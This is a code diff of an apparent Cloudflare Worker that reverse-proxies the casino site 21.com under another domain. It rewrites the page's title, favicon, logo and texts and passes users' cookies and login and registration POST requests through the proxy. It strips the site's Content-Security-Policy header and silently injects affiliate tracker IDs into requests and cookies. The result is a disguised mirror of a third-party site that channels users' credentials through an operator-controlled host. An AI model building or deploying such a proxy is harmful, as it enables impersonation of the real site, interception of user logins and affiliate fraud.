@@ -20,24 +20,18 @@ export default {
     };
     // =========================================================================
 
-    // Statische Dateien direkt durchlassen
-    const isStaticFile = url.pathname.match(/\.(png|jpg|jpeg|gif|svg|css|js|woff|woff2|ttf|eot|ico|json)$/i);
-    if (isStaticFile) {
-      const fetchUrl = new URL(url.pathname + url.search, targetBase);
-      return fetch(fetchUrl, {
-        headers: { "Host": "www.21.com", "User-Agent": request.headers.get("User-Agent") || "" }
-      });
-    }
-
+    // 1. Cookies auslesen
     const cookieHeader = request.headers.get("Cookie") || "";
     const cookies = Object.fromEntries(cookieHeader.split(';').map(c => {
       const [k, v] = c.trim().split('=');
       return [k, v];
     }));
 
-    let affiliateId = url.searchParams.get("affiliateId") || cookies["aff_affiliateId"];
-    let trackerId = url.searchParams.get("trackerId") || cookies["aff_trackerId"];
+    let trackerId = cookies["aff_trackerId"];
+    let affiliateId = cookies["aff_affiliateId"];
+    let setCookiesToSave = [];
 
+    // 2. Wenn noch keine Tracking-ID im Cookie ist, einmalig im Hintergrund anfragen
     if (!trackerId) {
       try {
         const trackerResponse = await fetch(affiliateTrackerUrl, {
@@ -55,18 +49,25 @@ export default {
           const redirectTarget = new URL(locationHeader);
           affiliateId = redirectTarget.searchParams.get("affiliateId");
           trackerId = redirectTarget.searchParams.get("trackerId");
+
+          if (trackerId) {
+            setCookiesToSave.push(`aff_trackerId=${trackerId}; Path=/; Max-Age=2592000; SameSite=Lax`);
+          }
+          if (affiliateId) {
+            setCookiesToSave.push(`aff_affiliateId=${affiliateId}; Path=/; Max-Age=2592000; SameSite=Lax`);
+          }
         }
       } catch (e) {}
     }
 
-    // URL-Parameter beim allerersten Aufruf setzen
-    if (request.method === "GET" && trackerId && !url.searchParams.has("trackerId")) {
-      url.searchParams.set("trackerId", trackerId);
-      if (affiliateId) url.searchParams.set("affiliateId", affiliateId);
-      return Response.redirect(url.toString(), 302);
+    // 3. Ziel-URL für das Casino aufbauen (Tracker-ID wird einmalig an den ersten Request übergeben)
+    const targetUrl = new URL(url.pathname + url.search, targetBase);
+    if (trackerId && !targetUrl.searchParams.has("trackerId")) {
+      targetUrl.searchParams.set("trackerId", trackerId);
+      if (affiliateId) targetUrl.searchParams.set("affiliateId", affiliateId);
     }
 
-    const fetchUrl = new URL(url.pathname + url.search, targetBase);
+    // 4. Anfrage an 21.com durchreichen (unterstützt GET und POST für Login/Registrierung)
     const proxyHeaders = new Headers(request.headers);
     proxyHeaders.set("Host", "www.21.com");
     proxyHeaders.set("Referer", "https://www.21.com/");
@@ -74,30 +75,23 @@ export default {
     const fetchOptions = {
       method: request.method,
       headers: proxyHeaders,
-      redirect: "manual"
+      redirect: "follow"
     };
 
     if (request.method === "POST") {
       fetchOptions.body = request.body;
     }
 
-    const response = await fetch(fetchUrl, fetchOptions);
-
-    // WICHTIG: Wenn 21.com umleitet, behalten wir die Tracker-IDs bei, um den Loop zu verhindern!
-    const locationHeader = response.headers.get("Location");
-    if (locationHeader && (response.status === 301 || response.status === 302 || response.status === 303)) {
-      const redirectUrl = new URL(locationHeader, targetBase);
-      redirectUrl.host = url.host; 
-
-      // Tracker-Parameter sicher in die neue Weiterleitung übernehmen
-      if (trackerId) redirectUrl.searchParams.set("trackerId", trackerId);
-      if (affiliateId) redirectUrl.searchParams.set("affiliateId", affiliateId);
-
-      return Response.redirect(redirectUrl.toString(), response.status);
+    let response;
+    try {
+      response = await fetch(targetUrl, fetchOptions);
+    } catch (err) {
+      return new Response("Proxy Error", { status: 500 });
     }
 
     const contentType = response.headers.get("content-type") || "";
 
+    // 5. Wenn HTML zurückkommt, Logo, Titel, Favicon und Texte anpassen
     if (contentType.includes("text/html")) {
       let newResponse = new HTMLRewriter()
         .on("head", {
@@ -110,8 +104,6 @@ export default {
               </style>
               <script>
                 (function() {
-                  const affId = "${affiliateId || ''}";
-                  const trkId = "${trackerId || ''}";
                   const newTitle = "${customTabTitle}";
                   const newFavicon = "${customFaviconUrl}";
                   const replacements = ${JSON.stringify(textReplacements)};
@@ -186,22 +178,6 @@ export default {
                     if (document.body) {
                       bodyObserver.observe(document.body, { childList: true, subtree: true });
                     }
-
-                    if (affId && trkId) {
-                      document.addEventListener("click", function(e) {
-                        const a = e.target.closest("a");
-                        if (a && a.href && a.href.startsWith(window.location.origin)) {
-                          try {
-                            const linkUrl = new URL(a.href);
-                            if (!linkUrl.searchParams.has("trackerId")) {
-                              linkUrl.searchParams.set("trackerId", trkId);
-                              linkUrl.searchParams.set("affiliateId", affId);
-                              a.href = linkUrl.toString();
-                            }
-                          } catch(err) {}
-                        }
-                      }, true);
-                    }
                   });
                 })();
               </script>
@@ -210,21 +186,31 @@ export default {
         })
         .transform(response);
 
-      const headers = new Headers(newResponse.headers);
-      if (trackerId) {
-        headers.append("Set-Cookie", `aff_trackerId=${trackerId}; Path=/; Max-Age=2592000; SameSite=Lax`);
-      }
-      if (affiliateId) {
-        headers.append("Set-Cookie", `aff_affiliateId=${affiliateId}; Path=/; Max-Age=2592000; SameSite=Lax`);
+      const finalHeaders = new Headers(newResponse.headers);
+      finalHeaders.delete("Content-Security-Policy"); // Verhindert Blockaden durch Sicherheitsrichtlinien des Casinos
+      
+      for (const c of setCookiesToSave) {
+        finalHeaders.append("Set-Cookie", c);
       }
 
       return new Response(newResponse.body, {
         status: newResponse.status,
         statusText: newResponse.statusText,
-        headers: headers
+        headers: finalHeaders
       });
     }
 
-    return response;
+    // Für Bilder, CSS, JS etc.
+    const finalHeaders = new Headers(response.headers);
+    finalHeaders.delete("Content-Security-Policy");
+    for (const c of setCookiesToSave) {
+      finalHeaders.append("Set-Cookie", c);
+    }
+
+    return new Response(response.body, {
+      status: response.status,
+      statusText: response.statusText,
+      headers: finalHeaders
+    });
   }
 };
